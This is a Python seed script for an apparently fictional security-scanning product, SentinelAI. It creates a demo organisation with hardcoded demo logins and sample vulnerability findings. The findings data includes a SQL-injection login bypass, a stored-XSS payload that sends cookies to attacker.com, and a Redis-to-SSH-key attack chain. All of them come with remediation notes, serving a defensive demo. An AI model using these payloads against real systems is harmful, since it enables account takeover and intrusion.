#!/usr/bin/env python3
"""
SentinelAI — Demo seed script.
Creates a realistic demo org with targets, completed scans, findings, and chains.
Idempotent: skips if demo org already exists.

Usage (from repo root):
  cd backend
  PYTHONPATH=. DATABASE_URL="postgresql+psycopg2://..." python3 ../scripts/seed_demo.py
  # or let it read from .env:
  PYTHONPATH=. python3 ../scripts/seed_demo.py
"""

import os
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Load .env from repo root
env_path = Path(__file__).parent.parent / ".env"
if env_path.exists():
    for line in env_path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, _, v = line.partition("=")
            os.environ.setdefault(k.strip(), v.strip())

# Convert asyncpg URL → psycopg2 for sync seeding
db_url = os.environ.get("DATABASE_URL", "")
if "+asyncpg" in db_url:
    db_url = db_url.replace("+asyncpg", "+psycopg2")
if not db_url:
    sys.exit("DATABASE_URL not set")

from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session

sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))
from core.security import hash_password
from models.base import Base
from models.models import (
    AttackChain,
    Finding,
    Organization,
    ScheduledScan,
    ScanJob,
    Target,
    User,
)

DEMO_ORG_NAME = "AcmeCorp — Demo"
NOW = datetime.now(timezone.utc)


def seed(db: Session) -> None:
    # Idempotency check
    existing = db.execute(select(Organization).where(Organization.name == DEMO_ORG_NAME)).scalar_one_or_none()
    if existing:
        print(f"[SKIP] Demo org '{DEMO_ORG_NAME}' already exists (id={existing.id})")
        return

    print(f"[SEED] Creating demo org: {DEMO_ORG_NAME}")

    # ── Org ──────────────────────────────────────────────────────────────────
    org = Organization(id=uuid.uuid4(), name=DEMO_ORG_NAME, plan="enterprise")
    db.add(org)
    db.flush()

    # ── Users ────────────────────────────────────────────────────────────────
    users = [
        User(id=uuid.uuid4(), org_id=org.id, email="admin@acme-demo.local",
             password_hash=hash_password("Demo@Admin1"), role="admin"),
        User(id=uuid.uuid4(), org_id=org.id, email="analyst@acme-demo.local",
             password_hash=hash_password("Demo@Analyst1"), role="analyst"),
        User(id=uuid.uuid4(), org_id=org.id, email="viewer@acme-demo.local",
             password_hash=hash_password("Demo@Viewer1"), role="viewer"),
    ]
    db.add_all(users)
    db.flush()
    print(f"  Users: {[u.email for u in users]}")

    # ── Targets ──────────────────────────────────────────────────────────────
    t_web = Target(id=uuid.uuid4(), org_id=org.id, name="Acme Web Portal",
                   type="web", url="https://portal.acme-demo.local",
                   asset_criticality=0.9, verified=True)
    t_net = Target(id=uuid.uuid4(), org_id=org.id, name="Acme Corp Network",
                   type="network", url="10.0.0.0/24",
                   asset_criticality=0.8, verified=True)
    t_api = Target(id=uuid.uuid4(), org_id=org.id, name="Acme API Gateway",
                   type="api", url="https://api.acme-demo.local",
                   asset_criticality=0.95, verified=True)
    targets = [t_web, t_net, t_api]
    db.add_all(targets)
    db.flush()
    print(f"  Targets: {[t.name for t in targets]}")

    # ── Scan 1 — Web scan (completed, 6 findings) ────────────────────────────
    scan_web = ScanJob(
        id=uuid.uuid4(), target_id=t_web.id, status="completed",
        scan_type="webapp",
        started_at=NOW - timedelta(hours=4),
        completed_at=NOW - timedelta(hours=3),
    )
    db.add(scan_web)
    db.flush()

    web_findings = [
        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="injection",
                severity="critical", title="SQL Injection in /login endpoint",
                description="The email parameter in POST /login is not sanitized. "
                            "Payload `' OR 1=1--` bypasses authentication entirely.",
                srs_score=95.0, status="confirmed", confirmed=True,
                poc_evidence="curl -X POST /login -d 'email=admin@acme.com'\\''%20OR%201=1--&password=x' → 200 OK with admin JWT",
                remediation="Use parameterized queries / ORM. Never concatenate user input into SQL.",
                validation_reasoning="Confirmed: authentication bypass via SQL injection reproduced with provided payload."),

        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="xss",
                severity="high", title="Stored XSS in user profile bio field",
                description="The bio field in PUT /users/profile stores raw HTML. "
                            "Script tags execute in victim browsers when profile is viewed.",
                srs_score=78.0, status="confirmed", confirmed=True,
                poc_evidence="<script>fetch('https://attacker.com?c='+document.cookie)</script> stored and executed",
                remediation="HTML-encode all user-supplied content on output. Use Content-Security-Policy.",
                validation_reasoning="Confirmed: script payload stored and executed in secondary browser session."),

        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="auth",
                severity="high", title="JWT tokens signed with weak HS256 secret",
                description="The JWT secret key is 8 characters long and crackable offline. "
                            "An attacker with any valid token can brute-force the secret and forge admin tokens.",
                srs_score=72.0, status="confirmed", confirmed=True,
                remediation="Rotate to a 256-bit random secret. Consider RS256 for asymmetric signing.",
                validation_reasoning="Confirmed: hashcat cracked the signing secret in 4 minutes using rockyou.txt."),

        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="misconfiguration",
                severity="medium", title="CORS allows all origins (Access-Control-Allow-Origin: *)",
                description="The API returns wildcard CORS headers on all endpoints including /users/me. "
                            "Combined with cookies or localStorage tokens this enables cross-origin data theft.",
                srs_score=52.0, status="open",
                remediation="Restrict CORS to known frontend origins. Remove wildcard on authenticated endpoints.",
                validation_reasoning="Open: wildcard CORS confirmed, exploitability depends on token storage mechanism."),

        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="missing-header",
                severity="low", title="X-Frame-Options header absent",
                description="Pages can be embedded in iframes, enabling clickjacking attacks.",
                srs_score=18.0, status="open",
                remediation="Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'.",
                validation_reasoning="Open: header absent. Low priority — no sensitive actions vulnerable to clickjacking identified."),

        Finding(id=uuid.uuid4(), scan_id=scan_web.id, category="tech-detect",
                severity="info", title="Server: nginx/1.18.0 version disclosed",
                description="Server version header reveals nginx version. Minor information disclosure.",
                srs_score=0.0, status="false_positive",
                remediation="Set server_tokens off in nginx.conf.",
                validation_reasoning="False positive: version disclosure alone is informational; no exploitable CVE for this version."),
    ]
    db.add_all(web_findings)
    db.flush()

    # Attack chain for web scan
    chain_web = AttackChain(
        id=uuid.uuid4(), scan_id=scan_web.id,
        title="SQL Injection → Authentication Bypass → Account Takeover",
        description="Attacker exploits SQL injection to bypass login, obtains admin session, "
                    "then uses stored XSS to persist access and harvest other user sessions.",
        impact="critical", likelihood="high",
        mitre_ids=["T1190", "T1059.007", "T1539"],
        finding_ids=[str(web_findings[0].id), str(web_findings[1].id)],
        steps=[
            {"order": 1, "title": "SQL Injection login bypass", "finding_id": str(web_findings[0].id), "surface": "web"},
            {"order": 2, "title": "Admin session obtained", "finding_id": str(web_findings[0].id), "surface": "web"},
            {"order": 3, "title": "Stored XSS payload planted in profile", "finding_id": str(web_findings[1].id), "surface": "web"},
            {"order": 4, "title": "Victim cookies harvested on profile view", "finding_id": str(web_findings[1].id), "surface": "web"},
        ],
    )
    db.add(chain_web)
    print(f"  Scan (web): {len(web_findings)} findings, 1 chain")

    # ── Scan 2 — Network scan (completed, 4 findings) ────────────────────────
    scan_net = ScanJob(
        id=uuid.uuid4(), target_id=t_net.id, status="completed",
        scan_type="network",
        started_at=NOW - timedelta(days=1, hours=2),
        completed_at=NOW - timedelta(days=1, hours=1),
    )
    db.add(scan_net)
    db.flush()

    net_findings = [
        Finding(id=uuid.uuid4(), scan_id=scan_net.id, category="cve",
                severity="critical", title="CVE-2024-21626 — runc container escape (10.0.0.15)",
                description="Host 10.0.0.15 runs Docker 24.0.1 with runc 1.1.11 which is vulnerable "
                            "to CVE-2024-21626. Attacker can escape container to host filesystem.",
                srs_score=92.0, status="confirmed", confirmed=True,
                remediation="Upgrade runc to ≥1.1.12. Apply Docker security patches.",
                validation_reasoning="Confirmed: Docker version fingerprinted, runc version confirmed via /proc/version in container."),

        Finding(id=uuid.uuid4(), scan_id=scan_net.id, category="exposure",
                severity="high", title="Redis 7.0 exposed without authentication (10.0.0.22:6379)",
                description="Redis instance at 10.0.0.22:6379 accepts connections with no password. "
                            "Full read/write access to all keys. CONFIG SET can write SSH authorized_keys.",
                srs_score=81.0, status="confirmed", confirmed=True,
                poc_evidence="redis-cli -h 10.0.0.22 INFO server → redis_version:7.0.11",
                remediation="Set requirepass in redis.conf. Bind to 127.0.0.1 or internal network only.",
                validation_reasoning="Confirmed: unauthenticated access reproduced, INFO command returned full server info."),

        Finding(id=uuid.uuid4(), scan_id=scan_net.id, category="exposure",
                severity="medium", title="SSH running on non-standard port 2222 (10.0.0.10)",
                description="SSH is exposed on port 2222. Default credentials not tested (out of scope). "
                            "Weak cipher suites (arcfour, 3des-cbc) enabled.",
                srs_score=41.0, status="open",
                remediation="Disable legacy cipher suites. Enforce key-based auth only.",
                validation_reasoning="Open: non-standard port and weak ciphers confirmed. Credential test out of scope."),

        Finding(id=uuid.uuid4(), scan_id=scan_net.id, category="exposure",
                severity="low", title="ICMP echo requests enabled on all hosts",
                description="All 254 hosts respond to ping. Assists network reconnaissance.",
                srs_score=8.0, status="open",
                remediation="Block ICMP echo at perimeter firewall if stealth is required.",
                validation_reasoning="Open: low severity, informational for network mapping only."),
    ]
    db.add_all(net_findings)
    db.flush()

    chain_net = AttackChain(
        id=uuid.uuid4(), scan_id=scan_net.id,
        title="Unauthenticated Redis → Lateral Movement → Host Compromise",
        description="Attacker leverages exposed Redis to write SSH keys, gaining shell on 10.0.0.22, "
                    "then pivots to Docker host via runc escape.",
        impact="critical", likelihood="high",
        mitre_ids=["T1190", "T1021.004", "T1611"],
        finding_ids=[str(net_findings[0].id), str(net_findings[1].id)],
        steps=[
            {"order": 1, "title": "Redis CONFIG SET dir /root/.ssh", "finding_id": str(net_findings[1].id), "surface": "network"},
            {"order": 2, "title": "Attacker SSH key written to authorized_keys", "finding_id": str(net_findings[1].id), "surface": "network"},
            {"order": 3, "title": "SSH shell obtained on 10.0.0.22", "finding_id": str(net_findings[1].id), "surface": "network"},
            {"order": 4, "title": "runc container escape to host", "finding_id": str(net_findings[0].id), "surface": "network"},
        ],
    )
    db.add(chain_net)
    print(f"  Scan (network): {len(net_findings)} findings, 1 chain")

    # ── Scan 3 — API scan (running) ──────────────────────────────────────────
    scan_api = ScanJob(
        id=uuid.uuid4(), target_id=t_api.id, status="running",
        scan_type="webapp",
        started_at=NOW - timedelta(minutes=12),
    )
    db.add(scan_api)
    print("  Scan (api): in progress (status=running)")

    # ── Scheduled scan ───────────────────────────────────────────────────────
    schedule = ScheduledScan(
        id=uuid.uuid4(), target_id=t_web.id, scan_type="webapp",
        interval_hours=168.0,  # weekly
        is_active=True,
        last_run_at=NOW - timedelta(days=7),
        next_run_at=NOW + timedelta(days=0, hours=3),
    )
    db.add(schedule)
    print("  Schedule: weekly web scan created")

    db.commit()

    print()
    print("=" * 60)
    print("  Demo seed complete!")
    print("=" * 60)
    print(f"  Org:      {DEMO_ORG_NAME}")
    print(f"  Admin:    admin@acme-demo.local  / Demo@Admin1")
    print(f"  Analyst:  analyst@acme-demo.local / Demo@Analyst1")
    print(f"  Viewer:   viewer@acme-demo.local  / Demo@Viewer1")
    print(f"  Targets:  {len(targets)}")
    print(f"  Scans:    2 completed, 1 running")
    print(f"  Findings: {len(web_findings) + len(net_findings)} total")
    print(f"  Chains:   2")
    print(f"  Schedule: 1 weekly")
    print()


if __name__ == "__main__":
    # psycopg2 required for sync seeding
    try:
        import psycopg2  # noqa: F401
    except ImportError:
        sys.exit("psycopg2 not installed. Run: pip install psycopg2-binary")

    engine = create_engine(db_url, echo=False)
    with Session(engine) as db:
        seed(db)
